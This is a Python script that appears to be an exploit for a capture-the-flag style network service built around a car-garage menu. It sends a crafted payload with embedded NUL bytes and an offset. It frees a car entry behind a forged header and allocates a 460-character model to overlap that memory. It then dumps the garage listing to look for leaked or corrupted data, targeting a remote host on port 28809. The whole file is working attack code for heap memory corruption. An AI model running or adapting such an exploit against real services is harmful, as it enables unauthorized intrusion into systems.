import socket, re, time, sys, io, os
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
ANSI = re.compile(rb'\x1b\[[0-9;]*m')

# payload: 4 filler + NUL + idx(0) + OFFlo(5) + NUL  -> 8 bytes
PAY = b'QQQQ' + b'\x00' + b'\x00' + b'\x05' + b'\x00'
FILL460 = 'Q' * 460

def build_seq(nul_copy_test=True):
    L = []
    # tune car 2 (Iris): Engine = PAY (8 bytes)
    L += ['4', '2', '', '', '', PAY, '', '', '', '', '', '', '']
    # tune car 3 (Kitsune): Model = '-'  -> free with forged header
    L += ['4', '3', '-', '', '', '', '', '', '', '', '', '', '']
    # build a class-15 model (460 chars)
    L += ['1', FILL460, '', '', '', '', '', '', '', '', '', '']
    # show garage
    L += ['3', '1', '1', '5']
    return L

def run(host, port, lines, wait=0.35):
    s = socket.create_connection((host, port), timeout=10); s.settimeout(wait)
    out = b''
    def drain(t):
        nonlocal out
        end = time.time() + t
        while time.time() < end:
            try: c = s.recv(65536)
            except socket.timeout: continue
            if not c: return
            out += c
    drain(1.0)
    for ln in lines:
        data = ln if isinstance(ln, bytes) else ln.encode('latin1')
        try: s.sendall(data + b'\n')
        except Exception as e:
            print('send err', e); break
        drain(wait)
    drain(0.5)
    s.close()
    return ANSI.sub(b'', out).decode('latin1')

target = sys.argv[1] if len(sys.argv) > 1 else 'remote'
if target == 'remote':
    txt = run('<host>', 28809, build_seq())
else:
    lines = build_seq()
    data = b''.join((l if isinstance(l, bytes) else l.encode('latin1')) + b'\n' for l in lines)
    open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'diff_in.bin'), 'wb').write(data)
    print('input written', len(data))
    sys.exit(0)
long_q = txt.count('Q' * 40)
print('=== %s ===' % target)
print('occurrences of 40+ Q runs in output:', long_q)
print('Kitsune present:', 'Kitsune K2' in txt)
print('len output:', len(txt))
i = txt.find('-- Garage --')
print(txt[i:i+1200].encode('ascii', 'replace').decode('ascii'))
